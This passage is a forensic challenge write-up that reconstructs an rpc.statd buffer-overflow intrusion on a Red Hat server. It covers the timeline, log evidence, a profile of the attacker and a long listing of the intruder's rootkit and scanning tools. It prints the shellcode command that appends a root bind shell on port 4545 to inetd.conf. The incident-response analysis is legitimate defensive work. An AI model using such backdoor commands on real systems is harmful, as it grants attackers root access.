@@ -1,0 +1,688 @@
+======================================
+Answers to Forensic Challege Questions
+======================================
+
+Q1. Identify the intrusion method, its date, and time. 
+    (Assume the clock on the IDS was synchronized with an NTP reference time source.) 
+
+       The first sign of the intruder attempting to access the system occurred on Nov
+       7 at 23:11:06 when a probe of the RPC port 111 was made from the attacking
+       machine.  After two telnet connections are made ( or more likely attempted ),
+       a RPC portmap-status-request is made containing a specially formatted request
+       string.
+       
+       This string causes a buffer overflow of the rpc.statd service that results in
+       the execution of embedded code using the increased privileges (root) of 
+       rpc.statd.  The shellcode, when executed, appended a new line of information 
+       to the file /etc/inetd.conf and restarted the inetd process to cause the new 
+       configuration to take affect.  The new configuration caused a root shell to be 
+       bound to port 4545 of the victim machine.
+       Here is the shell code that was executed:
+
+       /bin/sh -c echo 4545 stream tcp nowait root /bin/sh sh -i >> /etc/inetd.conf;
+       killall -HUP inetd  
+
+       The rpc.statd vulnerability is a known problem for older versions of certain 
+       Linux distributions, such as Redhat 6.2.  The rpc.statd input validation bug
+       is documented in CERT Advisory CA-2000-17: 
+ 
+        http://www.cert.org/advisories/CA-2000-17.html
+
+        Log files from the host do not show intruder activity until approximately 1 
+        hour after the IDS logged the buffer overflow attack.  This may indicate 
+        that the initial attempt failed, but at 00:08 on Nov 8 the system log shows
+        that two inetd processes were killed.  Also, a piece of a deleted system
+        log shows the shellcode in a RPC message.
+
+        /var/log/secure
+        ---------------
+        Nov  8 00:08:40 apollo in.telnetd[2077]: connect from 216.216.74.2
+        Nov  8 00:08:40 apollo in.telnetd[2078]: connect from 216.216.74.2
+ 
+        /var/log/messages
+        -----------------
+        Nov  8 00:08:41 apollo inetd[408]: pid 2077: exit status 1
+        Nov  8 00:08:41 apollo inetd[408]: pid 2078: exit status 1
+
+	/var/log/messsages (deleted)
+        ----------------------------
+        Nov  8 00:09:00 apollo rpc.statd[270]: SM_MON request for hostname containing '/': 
+	[ binary omiited ]
+        08049f10 bffff754 000028f8 4d5f4d53 72204e4f 65757165 66207473 6820726f 6e74736f 
+        20656d61 746e6f63 696e6961 2720676e 203a272f bffff704 bffff705 bffff706 bffff707
+        /bin/sh -c echo 4545 stream tcp nowait root /bin/sh sh -i >> /etc/inetd.conf;
+        killall -HUP inetd 
+     
+Q2. Identify as much as possible about the intruder(s).
+	Intruder Attacking IP:  216.216.74.2 (ATHM-216-216-xxx-2.home.net)
+        Other possible entry points:  24.12.200.186 (c871553-b.jffsn1.mo.home.com)
+
+        Attacker Motives  
+        --------------------
+        Root-and-run
+          The attacker appears to break in, install tools, and get out as fast as possible.
+          Most likely priming the box as a platform for further attacks using the 
+          island hopping approach.  Also suggests the .home.com machine is just another
+          compromised box rather than the attacker's machine.  If the same mistake of leaving
+          the sshd login recorder file exists on previous compromised hosts, and the attacker
+          logged in using this trojaned sshd this could be a way to track the attacker back 
+          to the source.
+
+        Evidence supporting this theory
+        (1) Relatively short amount of time on system
+        (2) Majority of activity appears to be automated installation of tools and backdoors.
+
+        The high level of automation and incomplete cleaning of log files suggests the attacker
+        is a script kiddie.  The intruder knows what the scripts do, but does not have a complete
+        understanding of the system he invades or the underlying mechanisms they exploit.
+        The use of sshd after it has been replaced with a trojan and leaving the recorded login
+        and password is a big mistake.  It is possible that the login was a genuine administrator.
+        There are several reasons that I believe it is the intruder.  First, the time of the login
+        appears to coincide with the intruder's time on the system.  Secondly, most system 
+        administrators follow a policy of logging in as a user and then 'su' to root.  Finally,
+        the incoming host is a node on the @home network just like the original IP address logged
+        by the IDS during the inital buffer overflow attack.
+
+	The attack signature fits the profile of the exploit program statdx.c written by ron1n 
+        and published under the rpc.statd Bugtraq report:
+ 
+        http://www.securityfocus.com/data/vulnerabilities/exploits/statdx.c
+
+
+Q3. List all the files that were added/modified by the intruder. 
+    Provide an analysis of these programs.
+
+    A detailed analysis of the intruder's toolkit can be found in toolkit.txt.
+    Below is a list of files that have been changed since Nov 8 08:40:00 according
+    to mactime followed by a list of modified binaries identified by a Tripwire
+    baseline comparison.
+
+[ Installation of intruder tools in a hidden directory ]
+Nov 08 00 08:51:54      714 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/a.sh
+                       7229 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/snif
+Nov 08 00 08:51:55      698 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/clean
+                     147900 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/inetd
+                      12495 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/killall
+                      49800 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/pstree
+                     133344 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/q
+                     132785 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/qs
+                       4096 ..c drwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan
+                       4096 ..c drwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/amd
+                        114 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/amd/a.sh
+                      12716 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/amd/amdx
+                      13023 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/amd/ben
+                       1455 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/amd/ben.c
+                      15667 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/amd/pscan
+                       4442 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/amd/pscan.c
+                       4096 ..c drwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/bind
+                       1760 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/bind/ibind.sh
+                       3980 ..c -rw-r--r-- 1010     users    /mnt/usr/man/.Ci/scan/bind/pscan.c
+                       4096 ..c drwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/daemon
+                       5907 ..c -rw------- 1010     users    /mnt/usr/man/.Ci/scan/daemon/lscan2.c
+                      12392 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/daemon/z0ne
+                       4096 ..c drwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/port
+                       4096 ..c drwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/port/strobe
+                        171 ..c -rw------- 1010     users    /mnt/usr/man/.Ci/scan/port/strobe/INSTALL
+                       1187 ..c -rw------- 1010     users    /mnt/usr/man/.Ci/scan/port/strobe/Makefile
+                         17 ..c -rw------- 1010     users    /mnt/usr/man/.Ci/scan/port/strobe/VERSION
+                       3296 ..c -rw------- 1010     users    /mnt/usr/man/.Ci/scan/port/strobe/strobe.1
+                      17364 ..c -rw------- 1010     users    /mnt/usr/man/.Ci/scan/port/strobe/strobe.c
+                      39950 ..c -rw------- 1010     users    /mnt/usr/man/.Ci/scan/port/strobe/strobe.services
+                       4096 ..c drwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/statd
+                       4390 ..c -rw-r--r-- 1010     users    /mnt/usr/man/.Ci/scan/statd/classb
+                      19140 ..c -rw-r--r-- 1010     users    /mnt/usr/man/.Ci/scan/statd/r
+                      21800 ..c -rw-r--r-- 1010     users    /mnt/usr/man/.Ci/scan/statd/statdx
+                       4096 ..c drwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/wu
+                      26676 ..c -rw-r--r-- 1010     users    /mnt/usr/man/.Ci/scan/wu/fs
+                      37760 ..c -rw-r--r-- 1010     users    /mnt/usr/man/.Ci/scan/wu/wu
+                       4096 ..c drwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/x
+                      15092 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/x/pscan
+                       3980 ..c -rw-r--r-- 1010     users    /mnt/usr/man/.Ci/scan/x/pscan.c
+                      17969 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/x/x
+                       1259 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/x/xfil
+                        385 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/x/xscan
+                       3098 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/snap
+                       5324 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/sp.pl
+                     350996 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/syslogd
+Nov 08 00 08:51:56     4096 ..c drwxr-xr-x 1010     users    /mnt/usr/man/.Ci/ 
+                        118 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/ /Anap
+                      12408 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/addn
+                         83 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/addps
+                    1052024 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/bx
+                        699 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/chmod-it
+                        328 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/do
+                     185988 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/find
+                      18535 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/fix
+                        156 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/needz
+                       4096 ..c drwxr-xr-x 1010     users    /mnt/usr/man/.Ci/paki
+                       8524 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/paki/slice2
+                       6793 ..c -rw-r--r-- 1010     users    /mnt/usr/man/.Ci/paki/stream.c
+                        188 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/rmS
+
+[ Prevent logging of intruder commands ]
+Nov 08 00 08:52:09        9 m.c lrwxrwxrwx root     root     /mnt/.bash_history -> /dev/null
+                          9 m.c lrwxrwxrwx root     root     /mnt/root/.bash_history -> /dev/null
+                          9 m.c lrwxrwxrwx root     root     /mnt/tmp/.bash_history -> /dev/null
+                          9 mac lrwxrwxrwx root     root     /mnt/usr/games/.bash_history -> /dev/null
+
+[ Backups of original system binaries replaced by trojans ]
+                       4096 mac drwxr-xr-x root     root     /mnt/usr/man/.Ci/backup
+                      42736 mac -rwxr-xr-x root     root     /mnt/usr/man/.Ci/backup/ifconfig
+                      43024 mac -rwxr-xr-x root     root     /mnt/usr/man/.Ci/backup/ls
+                      66736 mac -rwxr-xr-x root     root     /mnt/usr/man/.Ci/backup/netstat
+                      60080 mac -r-xr-xr-x root     root     /mnt/usr/man/.Ci/backup/ps
+                      23568 mac -rwxr-xr-x root     root     /mnt/usr/man/.Ci/backup/tcpd
+                      34896 mac -r-xr-xr-x root     root     /mnt/usr/man/.Ci/backup/top
+
+[ Files containing lists of process names and network addresses hidden by trojaned system tools ]
+Nov 08 00 08:52:12      102 mac -rw-r--r-- root     root     /mnt/usr/man/.a
+                         58 mac -rw-r--r-- root     root     /mnt/usr/man/.p
+                         58 mac -rw-r--r-- root     root     /mnt/usr/man/p
+                         61 m.c -rw-r--r-- root     root     /mnt/usr/man/r
+
+[ LinSniffer process id number and log file ]
+Nov 08 00 08:52:13        5 mac -rw-r--r-- root     root     /mnt/usr/man/.Ci/sniff.pid
+                          0 mac -rw-r--r-- root     root     /mnt/usr/man/.Ci/tcp.log
+Nov 08 00 08:52:15      171 ..c -rw-r--r-- 1010     users    /mnt/dev/ptyp
+
+[ RPM packages installed ]
+Nov 08 00 08:52:25      670 ..c -rw------- root     root     /mnt/etc/amd.conf
+                        105 ..c -rw-r----- root     root     /mnt/etc/amd.net
+                        766 ..c -rwxr-xr-x root     root     /mnt/etc/rc.d/init.d/amd
+                         56 ..c -rwxr-xr-x root     root     /mnt/etc/sysconfig/amd
+                       8024 ..c -rwxr-xr-x root     root     /mnt/usr/bin/pawd
+                       9084 ..c -rw-r--r-- root     root     /mnt/usr/doc/am-utils-6.0.1s11/AUTHORS
+                       3933 ..c -rw-r--r-- root     root     /mnt/usr/doc/am-utils-6.0.1s11/BUGS
+                     147946 ..c -rw-r--r-- root     root     /mnt/usr/doc/am-utils-6.0.1s11/ChangeLog
+                      23786 ..c -rw-r--r-- root     root     /mnt/usr/doc/am-utils-6.0.1s11/NEWS
+                       3817 ..c -rw-r--r-- root     root     /mnt/usr/doc/am-utils-6.0.1s11/README
+                       4113 ..c -rw-r--r-- root     root     /mnt/usr/doc/am-utils-6.0.1s11/README.autofs
+                       1225 ..c -rw-r--r-- root     root     /mnt/usr/doc/am-utils-6.0.1s11/README.y2k
+                     621985 ..c -rw-r--r-- root     root     /mnt/usr/doc/am-utils-6.0.1s11/am-utils.ps
+                       3201 ..c -rw-r--r-- root     root     /mnt/usr/doc/am-utils-6.0.1s11/amd.conf-sample
+Nov 08 00 08:52:26     4096 m.c drwxr-xr-x root     root     /mnt/usr/doc/am-utils-6.0.1s11
+                     189318 ..c -rw-r--r-- root     root     /mnt/usr/doc/am-utils-6.0.1s11/hlfsd.ps
+                       3006 ..c -rw-r--r-- root     root     /mnt/usr/doc/am-utils-6.0.1s11/lostaltmail.conf-sample
+                      15625 ..c -rw-r--r-- root     root     /mnt/usr/info/am-utils.info-1.gz
+                      15324 ..c -rw-r--r-- root     root     /mnt/usr/info/am-utils.info-2.gz
+                      14152 ..c -rw-r--r-- root     root     /mnt/usr/info/am-utils.info-3.gz
+                      13984 ..c -rw-r--r-- root     root     /mnt/usr/info/am-utils.info-4.gz
+                      15354 ..c -rw-r--r-- root     root     /mnt/usr/info/am-utils.info-5.gz
+                       5011 ..c -rw-r--r-- root     root     /mnt/usr/info/am-utils.info-6.gz
+                       7086 ..c -rw-r--r-- root     root     /mnt/usr/info/am-utils.info-7.gz
+                       2954 ..c -rw-r--r-- root     root     /mnt/usr/info/am-utils.info.gz
+                         15 m.c lrwxrwxrwx root     root     /mnt/usr/lib/libamu.so -> libamu.so.2.1.1
+                         15 m.c lrwxrwxrwx root     root     /mnt/usr/lib/libamu.so.2 -> libamu.so.2.1.1
+                      40370 ..c -rwxr-xr-x root     root     /mnt/usr/lib/libamu.so.2.1.1
+                       3026 ..c -rw-r--r-- root     root     /mnt/usr/man/man1/pawd.1
+                      19031 ..c -rw-r--r-- root     root     /mnt/usr/man/man5/amd.conf.5
+                      10003 ..c -rw-r--r-- root     root     /mnt/usr/man/man8/amd.8
+                       6318 ..c -rw-r--r-- root     root     /mnt/usr/man/man8/amq.8
+                       3784 ..c -rw-r--r-- root     root     /mnt/usr/man/man8/automount2amd.8
+                       5453 ..c -rw-r--r-- root     root     /mnt/usr/man/man8/fixmount.8
+                       2818 ..c -rw-r--r-- root     root     /mnt/usr/man/man8/fsinfo.8
+                       9641 ..c -rw-r--r-- root     root     /mnt/usr/man/man8/hlfsd.8
+                       2571 ..c -rw-r--r-- root     root     /mnt/usr/man/man8/mk-amd-map.8
+                       2806 ..c -rw-r--r-- root     root     /mnt/usr/man/man8/wire-test.8
+                       1043 ..c -rwxr-xr-x root     root     /mnt/usr/sbin/am-eject
+                     106640 ..c -rwxr-xr-x root     root     /mnt/usr/sbin/amd
+                       1392 ..c -rwxr-xr-x root     root     /mnt/usr/sbin/amd2ldif
+                       1003 ..c -rwxr-xr-x root     root     /mnt/usr/sbin/amd2sun
+                      13892 ..c -rwxr-xr-x root     root     /mnt/usr/sbin/amq
+                       2257 ..c -rwxr-xr-x root     root     /mnt/usr/sbin/automount2amd
+                       2170 ..c -rwxr-xr-x root     root     /mnt/usr/sbin/ctl-hlfsd
+                       1521 ..c -rwxr-xr-x root     root     /mnt/usr/sbin/fix-amd-map
+                      10808 ..c -rwxr-xr-x root     root     /mnt/usr/sbin/fixmount
+                        404 ..c -rwxr-xr-x root     root     /mnt/usr/sbin/fixrmtab
+                      34784 ..c -rwxr-xr-x root     root     /mnt/usr/sbin/fsinfo
+                      29656 ..c -rwxr-xr-x root     root     /mnt/usr/sbin/hlfsd
+                      18412 ..c -rwxr-xr-x root     root     /mnt/usr/sbin/lostaltmail
+                       7588 ..c -rwxr-xr-x root     root     /mnt/usr/sbin/mk-amd-map
+                        804 ..c -rwxr-xr-x root     root     /mnt/usr/sbin/wait4amd
+                        965 ..c -rwxr-xr-x root     root     /mnt/usr/sbin/wait4amd2die
+                       5140 ..c -rwxr-xr-x root     root     /mnt/usr/sbin/wire-test
+Nov 08 00 08:52:31    12333 m.c -rw-r--r-- root     root     /mnt/etc/ld.so.cache
+                         13 mac lrwxrwxrwx root     root     /mnt/etc/rc.d/rc0.d/K28amd -> ../init.d/amd
+                         13 mac lrwxrwxrwx root     root     /mnt/etc/rc.d/rc1.d/K28amd -> ../init.d/amd
+                         13 mac lrwxrwxrwx root     root     /mnt/etc/rc.d/rc2.d/K28amd -> ../init.d/amd
+                         13 mac lrwxrwxrwx root     root     /mnt/etc/rc.d/rc3.d/K28amd -> ../init.d/amd
+                         13 mac lrwxrwxrwx root     root     /mnt/etc/rc.d/rc4.d/K28amd -> ../init.d/amd
+                         13 mac lrwxrwxrwx root     root     /mnt/etc/rc.d/rc5.d/K28amd -> ../init.d/amd
+                         13 mac lrwxrwxrwx root     root     /mnt/etc/rc.d/rc6.d/K28amd -> ../init.d/amd
+Nov 08 00 08:52:32     1176 .ac -rwxr-xr-x root     root     /mnt/etc/rc.d/init.d/lpd
+                         13 .ac lrwxrwxrwx root     root     /mnt/etc/rc.d/rc0.d/K60lpd -> ../init.d/lpd
+                         13 .ac lrwxrwxrwx root     root     /mnt/etc/rc.d/rc1.d/K60lpd -> ../init.d/lpd
+                         13 .ac lrwxrwxrwx root     root     /mnt/etc/rc.d/rc2.d/S60lpd -> ../init.d/lpd
+                         13 .ac lrwxrwxrwx root     root     /mnt/etc/rc.d/rc3.d/S60lpd -> ../init.d/lpd
+                         13 .ac lrwxrwxrwx root     root     /mnt/etc/rc.d/rc5.d/S60lpd -> ../init.d/lpd
+                         13 .ac lrwxrwxrwx root     root     /mnt/etc/rc.d/rc6.d/K60lpd -> ../init.d/lpd
+                       3564 ..c -r--r--r-- root     root     /mnt/etc/screenrc
+                       3394 ..c -rw-r--r-- root     root     /mnt/etc/skel/.screenrc
+                          4 .ac lrwxrwxrwx root     root     /mnt/usr/bin/gmake -> make
+                      15816 ..c -r-xr-xr-x root     lp       /mnt/usr/bin/lpq
+                      15608 ..c -r-xr-xr-x root     lp       /mnt/usr/bin/lpr
+                      16248 ..c -r-xr-xr-x root     lp       /mnt/usr/bin/lprm
+                       3656 ..c -rwxr-xr-x root     root     /mnt/usr/bin/lptest
+                     104316 ..c -rwxr-xr-x root     root     /mnt/usr/bin/make
+                       4096 m.c drwxr-xr-x root     root     /mnt/usr/doc/make-3.77
+                      26571 ..c -rw-r--r-- root     root     /mnt/usr/doc/make-3.77/NEWS
+                       2141 ..c -r--r--r-- root     root     /mnt/usr/doc/make-3.77/README
+                      14727 ..c -rw-r--r-- root     root     /mnt/usr/info/make.info-1.gz
+                       1928 ..c -rw-r--r-- root     root     /mnt/usr/info/make.info-10.gz
+                      15693 ..c -rw-r--r-- root     root     /mnt/usr/info/make.info-2.gz
+                      15515 ..c -rw-r--r-- root     root     /mnt/usr/info/make.info-3.gz
+                      15275 ..c -rw-r--r-- root     root     /mnt/usr/info/make.info-4.gz
+                      15324 ..c -rw-r--r-- root     root     /mnt/usr/info/make.info-5.gz
+                      15459 ..c -rw-r--r-- root     root     /mnt/usr/info/make.info-6.gz
+                      14989 ..c -rw-r--r-- root     root     /mnt/usr/info/make.info-7.gz
+                       5385 ..c -rw-r--r-- root     root     /mnt/usr/info/make.info-8.gz
+                       7253 ..c -rw-r--r-- root     root     /mnt/usr/info/make.info-9.gz
+                       2111 .ac -rw-r--r-- root     root     /mnt/usr/info/make.info.gz
+                       4650 ..c -rwxr-xr-x root     root     /mnt/usr/man/man1/lpq.1
+                       7458 ..c -rw-r--r-- root     root     /mnt/usr/man/man1/lpr.1
+                       4633 ..c -rw-r--r-- root     root     /mnt/usr/man/man1/lprm.1
+                       2861 ..c -rw-r--r-- root     root     /mnt/usr/man/man1/lptest.1
+                       7598 ..c -rw-r--r-- root     root     /mnt/usr/man/man1/make.1
+                       7845 ..c -rw-r--r-- root     root     /mnt/usr/man/man5/printcap.5
+                       5907 ..c -rw-r--r-- root     root     /mnt/usr/man/man8/lpc.8
+                       7422 ..c -rw-r--r-- root     root     /mnt/usr/man/man8/lpd.8
+                       3857 ..c -rw-r--r-- root     root     /mnt/usr/man/man8/pac.8
+                      24104 ..c -rwxr-Sr-x root     lp       /mnt/usr/sbin/lpc
+                      51740 ..c -rwxr--r-- root     root     /mnt/usr/sbin/lpd
+                       5140 ..c -rwxr-xr-x root     root     /mnt/usr/sbin/lpf
+                       9412 ..c -rwxr--r-- root     root     /mnt/usr/sbin/pac
+Nov 08 00 08:52:33      114 ..c -rw-r--r-- root     root     /mnt/etc/X11/wmconfig/telnet
+                      13281 mac -rw-r--r-- root     root     /mnt/etc/info-dir
+                       1084 .ac -rwxr-xr-x root     root     /mnt/etc/rc.d/init.d/yppasswdd
+                       1137 .ac -rwxr-xr-x root     root     /mnt/etc/rc.d/init.d/ypserv
+                       1398 ..c -rw-r--r-- root     root     /mnt/etc/ypserv.conf
+                     236468 ..c -rwxr-xr-x root     root     /mnt/usr/bin/screen
+                      64608 ..c -rwxr-xr-x root     root     /mnt/usr/bin/telnet
+                       4096 m.c drwxr-xr-x root     root     /mnt/usr/doc/screen-3.9.4
+                      14081 ..c -rw-r--r-- root     root     /mnt/usr/doc/screen-3.9.4/FAQ
+                       3619 ..c -rw-r--r-- root     root     /mnt/usr/doc/screen-3.9.4/NEWS
+                       3437 ..c -rw-r--r-- root     root     /mnt/usr/doc/screen-3.9.4/README
+                       6447 ..c -rw-r--r-- root     root     /mnt/usr/doc/screen-3.9.4/README.DOTSCREEN
+                       4096 m.c drwxr-xr-x root     root     /mnt/usr/doc/ypserv-1.3.9
+                        191 ..c -rw-r--r-- root     root     /mnt/usr/doc/ypserv-1.3.9/BUGS
+                      34068 ..c -rw-r--r-- root     root     /mnt/usr/doc/ypserv-1.3.9/ChangeLog
+                       6037 ..c -rw-r--r-- root     root     /mnt/usr/doc/ypserv-1.3.9/INSTALL
+                       2471 ..c -rw-r--r-- root     root     /mnt/usr/doc/ypserv-1.3.9/NEWS
+                       3595 ..c -rw-r--r-- root     root     /mnt/usr/doc/ypserv-1.3.9/README
+                        259 ..c -rw-r--r-- root     root     /mnt/usr/doc/ypserv-1.3.9/README.etc
+                       2849 ..c -rw-r--r-- root     root     /mnt/usr/doc/ypserv-1.3.9/README.secure
+                        286 ..c -rw-r--r-- root     root     /mnt/usr/doc/ypserv-1.3.9/TODO
+                        471 ..c -rw-r--r-- root     root     /mnt/usr/doc/ypserv-1.3.9/securenets
+                       1398 ..c -rw-r--r-- root     root     /mnt/usr/doc/ypserv-1.3.9/ypserv.conf
+                       7242 ..c -rw-r--r-- root     root     /mnt/usr/include/rpcsvc/ypxfrd.x
+                      16094 ..c -rw-r--r-- root     root     /mnt/usr/info/screen.info-1.gz
+                      15113 ..c -rw-r--r-- root     root     /mnt/usr/info/screen.info-2.gz
+                      16847 ..c -rw-r--r-- root     root     /mnt/usr/info/screen.info-3.gz
+                      12505 ..c -rw-r--r-- root     root     /mnt/usr/info/screen.info-4.gz
+                       1978 .ac -rw-r--r-- root     root     /mnt/usr/info/screen.info.gz
+                       1361 ..c -rwxr-xr-x root     root     /mnt/usr/lib/yp/create_printcap
+                      12384 ..c -rwxr-xr-x root     root     /mnt/usr/lib/yp/makedbm
+                         95 ..c -rwxr-xr-x root     root     /mnt/usr/lib/yp/match_printcap
+                      10244 ..c -rwxr-xr-x root     root     /mnt/usr/lib/yp/mknetid
+                       2295 ..c -rwxr-xr-x root     root     /mnt/usr/lib/yp/pwupdate
+                      10004 ..c -rwxr-xr-x root     root     /mnt/usr/lib/yp/revnetgroup
+                      10884 ..c -rwxr-xr-x root     root     /mnt/usr/lib/yp/yphelper
+                       4110 ..c -rwxr-xr-x root     root     /mnt/usr/lib/yp/ypinit
+                      19272 ..c -rwxr-xr-x root     root     /mnt/usr/lib/yp/ypxfr
+                        329 ..c -rwxr-xr-x root     root     /mnt/usr/lib/yp/ypxfr_1perday
+                        246 ..c -rwxr-xr-x root     root     /mnt/usr/lib/yp/ypxfr_1perhour
+                        260 ..c -rwxr-xr-x root     root     /mnt/usr/lib/yp/ypxfr_2perday
+                     129824 ..c -rw-r--r-- root     root     /mnt/usr/man/man1/screen.1
+                      32150 ..c -rw-r--r-- root     root     /mnt/usr/man/man1/telnet.1
+                       1002 ..c -rw-r--r-- root     root     /mnt/usr/man/man5/issue.net.5
+                       1914 ..c -rw-r--r-- root     root     /mnt/usr/man/man5/netgroup.5
+                       2739 ..c -rw-r--r-- root     root     /mnt/usr/man/man5/ypserv.conf.5
+                      12823 ..c -rw-r--r-- root     root     /mnt/usr/man/man8/in.telnetd.8
+                       2112 ..c -rw-r--r-- root     root     /mnt/usr/man/man8/makedbm.8
+                       2492 ..c -rw-r--r-- root     root     /mnt/usr/man/man8/mknetid.8
+                        678 ..c -rw-r--r-- root     root     /mnt/usr/man/man8/pwupdate.8
+                        592 ..c -rw-r--r-- root     root     /mnt/usr/man/man8/revnetgroup.8
+                       6962 ..c -rw-r--r-- root     root     /mnt/usr/man/man8/rpc.yppasswdd.8
+                       4004 ..c -rw-r--r-- root     root     /mnt/usr/man/man8/rpc.ypxfrd.8
+                         12 mac lrwxrwxrwx root     root     /mnt/usr/man/man8/telnetd.8 -> in.telnetd.8
+                       1593 ..c -rw-r--r-- root     root     /mnt/usr/man/man8/ypinit.8
+                         25 ..c -rw-r--r-- root     root     /mnt/usr/man/man8/yppasswdd.8
+                       2830 ..c -rw-r--r-- root     root     /mnt/usr/man/man8/yppush.8
+                       4886 ..c -rw-r--r-- root     root     /mnt/usr/man/man8/ypserv.8
+                       4320 ..c -rw-r--r-- root     root     /mnt/usr/man/man8/ypxfr.8
+                         22 ..c -rw-r--r-- root     root     /mnt/usr/man/man8/ypxfrd.8
+                      35628 ..c -rwxr-xr-x root     root     /mnt/usr/sbin/in.telnetd
+                      18448 ..c -rwxr-xr-x root     root     /mnt/usr/sbin/rpc.yppasswdd
+                      25212 ..c -rwxr-xr-x root     root     /mnt/usr/sbin/rpc.ypxfrd
+                      14520 ..c -rwxr-xr-x root     root     /mnt/usr/sbin/yppush
+                      40476 ..c -rwxr-xr-x root     root     /mnt/usr/sbin/ypserv
+                      13843 ..c -rw-r--r-- root     root     /mnt/var/yp/Makefile
+                        471 ..c -rw-r--r-- root     root     /mnt/var/yp/securenets
+Nov 08 00 08:52:34  1052024 m.c -rwxr-xr-x root     root     /mnt/bin/bx
+Nov 08 00 08:53:06     1024 m.c drwxr-x--- root     root     /mnt/root
+Nov 08 00 08:53:08    12288 m.c -rw-rw-r-- root     root     /mnt/etc/psdevtab
+Nov 08 00 08:53:10      537 m.c -rw------- root     root     /mnt/etc/ssh_host_key
+                        341 mac -rw-r--r-- root     root     /mnt/etc/ssh_host_key.pub
+                        512 m.c -rw------- root     root     /mnt/root/.ssh/random_seed
+Nov 08 00 08:53:11      880 m.c -rw-r--r-- root     root     /mnt/etc/ssh_config
+                          3 mac lrwxrwxrwx root     root     /mnt/usr/local/bin/slogin -> ssh
+                          4 mac lrwxrwxrwx root     root     /mnt/usr/local/bin/ssh -> ssh1
+                         11 mac lrwxrwxrwx root     root     /mnt/usr/local/bin/ssh-keygen -> ssh-keygen1
+                     327262 mac -rwxr-xr-x root     root     /mnt/usr/local/bin/ssh-keygen1
+                     604938 mac -rws--x--x root     root     /mnt/usr/local/bin/ssh1
+Nov 08 00 08:53:12       21 mac lrwxrwxrwx root     root     /mnt/usr/local/bin/make-ssh-known-hosts -> make-ssh-known-hosts1
+                      21228 mac -rwxr-xr-x root     root     /mnt/usr/local/bin/make-ssh-known-hosts1
+                          4 mac lrwxrwxrwx root     root     /mnt/usr/local/bin/scp -> scp1
+                      90424 mac -rwxr-xr-x root     root     /mnt/usr/local/bin/scp1
+                          8 mac lrwxrwxrwx root     root     /mnt/usr/local/bin/ssh-add -> ssh-add1
+                     337617 mac -rwxr-xr-x root     root     /mnt/usr/local/bin/ssh-add1
+                         10 mac lrwxrwxrwx root     root     /mnt/usr/local/bin/ssh-agent -> ssh-agent1
+                     343586 mac -rwxr-xr-x root     root     /mnt/usr/local/bin/ssh-agent1
+                          5 m.c lrwxrwxrwx root     root     /mnt/usr/local/sbin/sshd -> sshd1
+                     643674 m.c -rwxr-xr-x root     root     /mnt/usr/local/sbin/sshd1
+Nov 08 00 08:53:13      955 m.c -rwxr-xr-x root     root     /mnt/etc/rc.d/rc.local
+                        684 m.c -rw-r--r-- root     root     /mnt/etc/sshd_config
+                         23 mac lrwxrwxrwx root     root     /mnt/usr/local/man/man1/make-ssh-known-hosts.1 -> make-ssh-known-hosts1.1
+                      12272 mac -rw-r--r-- root     root     /mnt/usr/local/man/man1/make-ssh-known-hosts1.1
+                          6 mac lrwxrwxrwx root     root     /mnt/usr/local/man/man1/scp.1 -> scp1.1
+                       4892 mac -rw-r--r-- root     root     /mnt/usr/local/man/man1/scp1.1
+                          5 mac lrwxrwxrwx root     root     /mnt/usr/local/man/man1/slogin.1 -> ssh.1
+                          6 mac lrwxrwxrwx root     root     /mnt/usr/local/man/man1/slogin1.1 -> ssh1.1
+                         10 mac lrwxrwxrwx root     root     /mnt/usr/local/man/man1/ssh-add.1 -> ssh-add1.1
+                       4007 mac -rw-r--r-- root     root     /mnt/usr/local/man/man1/ssh-add1.1
+                         12 mac lrwxrwxrwx root     root     /mnt/usr/local/man/man1/ssh-agent.1 -> ssh-agent1.1
+                       6265 mac -rw-r--r-- root     root     /mnt/usr/local/man/man1/ssh-agent1.1
